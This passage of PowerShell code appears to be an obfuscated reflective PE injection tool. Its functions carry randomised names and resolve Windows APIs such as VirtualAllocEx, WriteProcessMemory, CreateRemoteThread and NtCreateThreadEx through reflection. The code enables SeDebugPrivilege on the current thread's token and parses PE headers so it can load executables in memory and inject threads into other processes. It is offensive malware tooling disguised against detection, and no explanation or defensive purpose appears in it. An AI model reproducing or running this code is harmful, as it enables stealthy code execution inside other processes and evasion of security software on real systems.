		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $xKjVQlKx
	}
	Function KoDoDYXx
	{
		$gxNuhWuM = New-Object System.Object
		$CDKUWtHy = KFAcNuvn kernel32.dll VirtualAlloc
		$tafHysKn = OThsxKhu @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$bVEdioXS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CDKUWtHy, $tafHysKn)
		$gxNuhWuM | Add-Member NoteProperty -Name VirtualAlloc -Value $bVEdioXS
		$bVEdioXSExAddr = KFAcNuvn kernel32.dll VirtualAllocEx
		$bVEdioXSExDelegate = OThsxKhu @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$bVEdioXSEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bVEdioXSExAddr, $bVEdioXSExDelegate)
		$gxNuhWuM | Add-Member NoteProperty -Name VirtualAllocEx -Value $bVEdioXSEx
		$WPVQkDgj = KFAcNuvn msvcrt.dll memcpy
		$BFeCEQZN = OThsxKhu @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$oqvKrmDH = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WPVQkDgj, $BFeCEQZN)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name memcpy -Value $oqvKrmDH
		$GqmYegAL = KFAcNuvn msvcrt.dll memset
		$wimesvpQ = OThsxKhu @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$frNYpwBi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GqmYegAL, $wimesvpQ)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name memset -Value $frNYpwBi
		$vxFUJYxX = KFAcNuvn kernel32.dll LoadLibraryA
		$UsZRDOca = OThsxKhu @([String]) ([IntPtr])
		$EVqrncXKoWucfjr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vxFUJYxX, $UsZRDOca)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $EVqrncXKoWucfjr
		$vtGHjvgk = KFAcNuvn kernel32.dll GetProcAddress
		$tSuUikeC = OThsxKhu @([IntPtr], [String]) ([IntPtr])
		$LPyAtuYb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vtGHjvgk, $tSuUikeC)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $LPyAtuYb
		$LPyAtuYbIntPtrAddr = KFAcNuvn kernel32.dll GetProcAddress 
		$LPyAtuYbIntPtrDelegate = OThsxKhu @([IntPtr], [IntPtr]) ([IntPtr])
		$LPyAtuYbIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LPyAtuYbIntPtrAddr, $LPyAtuYbIntPtrDelegate)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $LPyAtuYbIntPtr
		$MYpYeRwS = KFAcNuvn kernel32.dll VirtualFree
		$nUdPyOPa = OThsxKhu @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$SEcqQGxq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MYpYeRwS, $nUdPyOPa)
		$gxNuhWuM | Add-Member NoteProperty -Name VirtualFree -Value $SEcqQGxq
		$SEcqQGxqExAddr = KFAcNuvn kernel32.dll VirtualFreeEx
		$SEcqQGxqExDelegate = OThsxKhu @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$SEcqQGxqEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SEcqQGxqExAddr, $SEcqQGxqExDelegate)
		$gxNuhWuM | Add-Member NoteProperty -Name VirtualFreeEx -Value $SEcqQGxqEx
		$RQdlEhwl = KFAcNuvn kernel32.dll VirtualProtect
		$DzObnFUS = OThsxKhu @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$pWwnSgTO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RQdlEhwl, $DzObnFUS)
		$gxNuhWuM | Add-Member NoteProperty -Name VirtualProtect -Value $pWwnSgTO
		$XHVSCMVR = KFAcNuvn kernel32.dll GetModuleHandleA
		$OEtiHbSf = OThsxKhu @([String]) ([IntPtr])
		$nGupMuTm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XHVSCMVR, $OEtiHbSf)
		$gxNuhWuM | Add-Member NoteProperty -Name GetModuleHandle -Value $nGupMuTm
		$xeLdAbst = KFAcNuvn kernel32.dll FreeLibrary
		$LFTClGdE = OThsxKhu @([Bool]) ([IntPtr])
		$WviErXbU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xeLdAbst, $LFTClGdE)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $WviErXbU
		$msuHUeZU = KFAcNuvn kernel32.dll OpenProcess
	    $oICmCUIF = OThsxKhu @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $VXbyUtTB = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($msuHUeZU, $oICmCUIF)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $VXbyUtTB
		$lqanKgyu = KFAcNuvn kernel32.dll WaitForSingleObject
	    $SYSlhIoS = OThsxKhu @([IntPtr], [UInt32]) ([UInt32])
	    $tauPoxhI = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lqanKgyu, $SYSlhIoS)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $tauPoxhI
		$KZbkbKtO = KFAcNuvn kernel32.dll WriteProcessMemory
        $cJtrKJhs = OThsxKhu @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $QGhOvDVa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KZbkbKtO, $cJtrKJhs)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $QGhOvDVa
		$oDnpAFAH = KFAcNuvn kernel32.dll ReadProcessMemory
        $RsKIrutu = OThsxKhu @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $IeaKjIRG = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($oDnpAFAH, $RsKIrutu)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $IeaKjIRG
		$tKHvqReG = KFAcNuvn kernel32.dll CreateRemoteThread
        $lQwedyaP = OThsxKhu @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $dNTpCnju = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tKHvqReG, $lQwedyaP)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $dNTpCnju
		$olfMibex = KFAcNuvn kernel32.dll GetExitCodeThread
        $cyyeiuyI = OThsxKhu @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $nBUbeXyh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($olfMibex, $cyyeiuyI)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $nBUbeXyh
		$tOmaZcyK = KFAcNuvn Advapi32.dll OpenThreadToken
        $YQPSNAgu = OThsxKhu @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $ZCfgbxZC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tOmaZcyK, $YQPSNAgu)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $ZCfgbxZC
		$ODBLbeYV = KFAcNuvn kernel32.dll GetCurrentThread
        $JJXkpLWk = OThsxKhu @() ([IntPtr])
        $dFDfMPud = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ODBLbeYV, $JJXkpLWk)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $dFDfMPud
		$UFHoSIQj = KFAcNuvn Advapi32.dll AdjustTokenPrivileges
        $FhmdQlJQ = OThsxKhu @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $sUbcUmIp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UFHoSIQj, $FhmdQlJQ)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $sUbcUmIp
		$ZQQsLtxF = KFAcNuvn Advapi32.dll LookupPrivilegeValueA
        $uKvvbCCP = OThsxKhu @([String], [String], [IntPtr]) ([Bool])
        $ZboHTwql = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZQQsLtxF, $uKvvbCCP)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $ZboHTwql
		$vUMTnhja = KFAcNuvn Advapi32.dll ImpersonateSelf
        $dkNIDzVa = OThsxKhu @([Int32]) ([Bool])
        $WxVuXLbj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vUMTnhja, $dkNIDzVa)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $WxVuXLbj
		$vycMQZzG = KFAcNuvn NtDll.dll NtCreateThreadEx
        $XGVOnjjL = OThsxKhu @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $OXBJwPpa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vycMQZzG, $XGVOnjjL)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $OXBJwPpa
		$gGGxGtZC = KFAcNuvn Kernel32.dll IsWow64Process
        $MgNkaZuB = OThsxKhu @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $bNphYMWL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gGGxGtZC, $MgNkaZuB)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $bNphYMWL
		$ycuyStzC = KFAcNuvn Kernel32.dll CreateThread
        $ICYEDdnl = OThsxKhu @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $vKbqLoBq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ycuyStzC, $ICYEDdnl)
		$gxNuhWuM | Add-Member -MemberType NoteProperty -Name CreateThread -Value $vKbqLoBq
		return $gxNuhWuM
	}
	Function MSysmFEP
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Int64]
		$ONbwZzGK,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[Int64]
		$VpEDqgWU
		)
		[Byte[]]$ONbwZzGKBytes = [BitConverter]::GetBytes($ONbwZzGK)
		[Byte[]]$VpEDqgWUBytes = [BitConverter]::GetBytes($VpEDqgWU)
		[Byte[]]$YUzlmeZt = [BitConverter]::GetBytes([UInt64]0)
		if ($ONbwZzGKBytes.Count -eq $VpEDqgWUBytes.Count)
		{
			$OKwmaTjO = 0
			for ($EVqrncXK = 0; $EVqrncXK -lt $ONbwZzGKBytes.Count; $EVqrncXK++)
			{
				$MOOvzUCm = $ONbwZzGKBytes[$EVqrncXK] - $OKwmaTjO
				if ($MOOvzUCm -lt $VpEDqgWUBytes[$EVqrncXK])
				{
					$MOOvzUCm += 256
					$OKwmaTjO = 1
				}
				else
				{
					$OKwmaTjO = 0
				}
				[UInt16]$mEiMQyBg = $MOOvzUCm - $VpEDqgWUBytes[$EVqrncXK]
				$YUzlmeZt[$EVqrncXK] = $mEiMQyBg -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		return [BitConverter]::ToInt64($YUzlmeZt, 0)
	}
	Function XcvoUanJ
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Int64]
		$ONbwZzGK,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[Int64]
		$VpEDqgWU
		)
		[Byte[]]$ONbwZzGKBytes = [BitConverter]::GetBytes($ONbwZzGK)
		[Byte[]]$VpEDqgWUBytes = [BitConverter]::GetBytes($VpEDqgWU)
		[Byte[]]$YUzlmeZt = [BitConverter]::GetBytes([UInt64]0)
		if ($ONbwZzGKBytes.Count -eq $VpEDqgWUBytes.Count)
		{
			$OKwmaTjO = 0
			for ($EVqrncXK = 0; $EVqrncXK -lt $ONbwZzGKBytes.Count; $EVqrncXK++)
			{
				[UInt16]$mEiMQyBg = $ONbwZzGKBytes[$EVqrncXK] + $VpEDqgWUBytes[$EVqrncXK] + $OKwmaTjO
				$YUzlmeZt[$EVqrncXK] = $mEiMQyBg -band 0x00FF
				if (($mEiMQyBg -band 0xFF00) -eq 0x100)
				{
					$OKwmaTjO = 1
				}
				else
				{
					$OKwmaTjO = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		return [BitConverter]::ToInt64($YUzlmeZt, 0)
	}
	Function zeePrHcq
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Int64]
		$ONbwZzGK,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[Int64]
		$VpEDqgWU
		)
		[Byte[]]$ONbwZzGKBytes = [BitConverter]::GetBytes($ONbwZzGK)
		[Byte[]]$VpEDqgWUBytes = [BitConverter]::GetBytes($VpEDqgWU)
		if ($ONbwZzGKBytes.Count -eq $VpEDqgWUBytes.Count)
		{
			for ($EVqrncXK = $ONbwZzGKBytes.Count-1; $EVqrncXK -ge 0; $EVqrncXK--)
			{
				if ($ONbwZzGKBytes[$EVqrncXK] -gt $VpEDqgWUBytes[$EVqrncXK])
				{
					return $rvAMLFnZ
				}
				elseif ($ONbwZzGKBytes[$EVqrncXK] -lt $VpEDqgWUBytes[$EVqrncXK])
				{
					return $WCARTiiv
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		return $WCARTiiv
	}
	Function CyZOpdEm
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[UInt64]
		$MOOvzUCmue
		)
		[Byte[]]$MOOvzUCmueBytes = [BitConverter]::GetBytes($MOOvzUCmue)
		return ([BitConverter]::ToInt64($MOOvzUCmueBytes, 0))
	}
    Function rbMuqydu
    {
        Param(
        [Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
        $MOOvzUCmue 
        )
        $MOOvzUCmueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$MOOvzUCmue.GetType()) * 2
        $ZubpZuPV = "0x{0:X$($MOOvzUCmueSize)}" -f [Int64]$MOOvzUCmue 
        return $ZubpZuPV
    }
	Function zCLXNXOI
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[String]
		$lQZwJfwV,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$iaTYMTPo,
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$sUuqywap,
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$GVzAKQMD
		)
		[IntPtr]$rRWEdWAE = [IntPtr]::Zero
		if ($YxeVtHnK.ParameterSetName -eq "Size")
		{
			[IntPtr]$rRWEdWAE = [IntPtr](XcvoUanJ ($iaTYMTPo) ($GVzAKQMD))
		}
		else
		{
			$rRWEdWAE = $sUuqywap
		}
		$FEefZsFv = $brIcZJPz.EndAddress
		if ((zeePrHcq ($brIcZJPz.PEHandle) ($iaTYMTPo)) -eq $rvAMLFnZ)
		{
			Throw "Trying to write to memory smaller than allocated address range. $lQZwJfwV"
		}
		if ((zeePrHcq ($rRWEdWAE) ($FEefZsFv)) -eq $rvAMLFnZ)
		{
			Throw "Trying to write to memory greater than allocated address range. $lQZwJfwV"
		}
	}
	Function SvvLofPM
	{
		Param(
			[Parameter(Position=0, Mandatory = $rvAMLFnZ)]
			[Byte[]]
			$AnvNPDBB,
			[Parameter(Position=1, Mandatory = $rvAMLFnZ)]
			[IntPtr]
			$sCQClMET
		)
		for ($cNvBKtfC = 0; $cNvBKtfC -lt $AnvNPDBB.Length; $cNvBKtfC++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($sCQClMET, $cNvBKtfC, $AnvNPDBB[$cNvBKtfC])
		}
	}
	Function OThsxKhu
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        $HlCauZii = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        $LkpitVIu = [Void]
	    )
	    $tCBRuuTI = [AppDomain]::CurrentDomain
	    $RGrKWLgo = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $qwHSndlK = $tCBRuuTI.DefineDynamicAssembly($RGrKWLgo, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $LqiKuRGh = $qwHSndlK.DefineDynamicModule('InMemoryModule', $WCARTiiv)
	    $QSgTmIQY = $LqiKuRGh.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $fNGIjAaB = $QSgTmIQY.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $HlCauZii)
	    $fNGIjAaB.SetImplementationFlags('Runtime, Managed')
	    $oFUIhntX = $QSgTmIQY.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $LkpitVIu, $HlCauZii)
	    $oFUIhntX.SetImplementationFlags('Runtime, Managed')
	    Write-Output $QSgTmIQY.CreateType()
	}
	Function KFAcNuvn
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $fTGZdyZg )]
	        [String]
	        $kXkMaLPJ,
	        [Parameter( Position = 1, Mandatory = $fTGZdyZg )]
	        [String]
	        $smvkgJkz
	    )
	    $bXSYAONO = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $FZnYWsGh = $bXSYAONO.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $nGupMuTm = $FZnYWsGh.GetMethod('GetModuleHandle')
	    $LPyAtuYb = $FZnYWsGh.GetMethod('GetProcAddress')
	    $BgQVkMYt = $nGupMuTm.Invoke($buwbSEkt, @($kXkMaLPJ))
	    $aMXxYDso = New-Object IntPtr
	    $eDmAwMcw = New-Object System.Runtime.InteropServices.HandleRef($aMXxYDso, $BgQVkMYt)
	    Write-Output $LPyAtuYb.Invoke($buwbSEkt, @([System.Runtime.InteropServices.HandleRef]$eDmAwMcw, $smvkgJkz))
	}
	Function rNmGpGlR
	{
		Param(
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx
		)
		[IntPtr]$pkOmpJhK = $gxNuhWuM.GetCurrentThread.Invoke()
		if ($pkOmpJhK -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		[IntPtr]$dZKVqdZm = [IntPtr]::Zero
		[Bool]$mGWEuovT = $gxNuhWuM.OpenThreadToken.Invoke($pkOmpJhK, $xKjVQlKx.TOKEN_QUERY -bor $xKjVQlKx.TOKEN_ADJUST_PRIVILEGES, $WCARTiiv, [Ref]$dZKVqdZm)
		if ($mGWEuovT -eq $WCARTiiv)
		{
			$kwWVhTmc = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($kwWVhTmc -eq $xKjVQlKx.ERROR_NO_TOKEN)
			{
				$mGWEuovT = $gxNuhWuM.ImpersonateSelf.Invoke(3)
				if ($mGWEuovT -eq $WCARTiiv)
				{
					Throw "Unable to impersonate self"
				}
				$mGWEuovT = $gxNuhWuM.OpenThreadToken.Invoke($pkOmpJhK, $xKjVQlKx.TOKEN_QUERY -bor $xKjVQlKx.TOKEN_ADJUST_PRIVILEGES, $WCARTiiv, [Ref]$dZKVqdZm)
				if ($mGWEuovT -eq $WCARTiiv)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $kwWVhTmc"
			}
		}
		[IntPtr]$BBXCfUnd = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.LUID))
		$mGWEuovT = $gxNuhWuM.LookupPrivilegeValue.Invoke($buwbSEkt, "SeDebugPrivilege", $BBXCfUnd)
		if ($mGWEuovT -eq $WCARTiiv)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$VbZpsVtg = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.TOKEN_PRIVILEGES)
		[IntPtr]$wJEkLlQA = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VbZpsVtg)
		$KcbhSdBn = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wJEkLlQA, [Type]$stADljpQ.TOKEN_PRIVILEGES)
		$KcbhSdBn.PrivilegeCount = 1
		$KcbhSdBn.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BBXCfUnd, [Type]$stADljpQ.LUID)
		$KcbhSdBn.Privileges.Attributes = $xKjVQlKx.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($KcbhSdBn, $wJEkLlQA, $rvAMLFnZ)
		$mGWEuovT = $gxNuhWuM.AdjustTokenPrivileges.Invoke($dZKVqdZm, $WCARTiiv, $wJEkLlQA, $VbZpsVtg, [IntPtr]::Zero, [IntPtr]::Zero)
		$kwWVhTmc = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if (($mGWEuovT -eq $WCARTiiv) -or ($kwWVhTmc -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($wJEkLlQA)
	}
	Function FYISLKhm
	{
		Param(
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$aCIHFtCN,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$iaTYMTPo,
		[Parameter(Position = 3, Mandatory = $WCARTiiv)]
		[IntPtr]
		$rkvCsCCU = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM
		)
		[IntPtr]$IfKkPBPE = [IntPtr]::Zero
		$WzqtjetU = [Environment]::OSVersion.Version
		if (($WzqtjetU -ge (New-Object 'Version' 6,0)) -and ($WzqtjetU -lt (New-Object 'Version' 6,2)))
		{
			$RknMwOWP= $gxNuhWuM.NtCreateThreadEx.Invoke([Ref]$IfKkPBPE, 0x1FFFFF, [IntPtr]::Zero, $aCIHFtCN, $iaTYMTPo, $rkvCsCCU, $WCARTiiv, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$KFiunbmY = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($IfKkPBPE -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RknMwOWP. LastError: $KFiunbmY"
			}
		}
		else
		{
			$IfKkPBPE = $gxNuhWuM.CreateRemoteThread.Invoke($aCIHFtCN, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $iaTYMTPo, $rkvCsCCU, 0, [IntPtr]::Zero)
		}
		if ($IfKkPBPE -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		return $IfKkPBPE
	}
	Function HUhvTeLH
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$QuNkENTk,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ
		)
		$cWsYqupr = New-Object System.Object
		$ihZeUtQG = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QuNkENTk, [Type]$stADljpQ.IMAGE_DOS_HEADER)
		[IntPtr]$GEzhHzdp = [IntPtr](XcvoUanJ ([Int64]$QuNkENTk) ([Int64][UInt64]$ihZeUtQG.e_lfanew))
		$cWsYqupr | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $GEzhHzdp
		$EVqrncXKmageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GEzhHzdp, [Type]$stADljpQ.IMAGE_NT_HEADERS64)
	    if ($EVqrncXKmageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		if ($EVqrncXKmageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$cWsYqupr | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $EVqrncXKmageNtHeaders64
			$cWsYqupr | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $rvAMLFnZ
		}
		else
		{
			$xRPjBLsU = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GEzhHzdp, [Type]$stADljpQ.IMAGE_NT_HEADERS32)
			$cWsYqupr | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $EVqrncXKmageNtHeaders32
			$cWsYqupr | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $WCARTiiv
		}
		return $cWsYqupr
	}
	Function RfEIvrYp
	{
		Param(
		[Parameter( Position = 0, Mandatory = $rvAMLFnZ )]
		[Byte[]]
		$YyOqIfFM,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ
		)
		$brIcZJPz = New-Object System.Object
		[IntPtr]$lIkWnyHt = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($YyOqIfFM.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($YyOqIfFM, 0, $lIkWnyHt, $YyOqIfFM.Length) | Out-Null
		$cWsYqupr = HUhvTeLH -PEHandle $lIkWnyHt -Win32Types $stADljpQ
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($cWsYqupr.PE64Bit)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($cWsYqupr.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($cWsYqupr.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($cWsYqupr.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($cWsYqupr.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($lIkWnyHt)
		return $brIcZJPz
	}
	Function TBNBnYHB
	{
		Param(
		[Parameter( Position = 0, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$QuNkENTk,
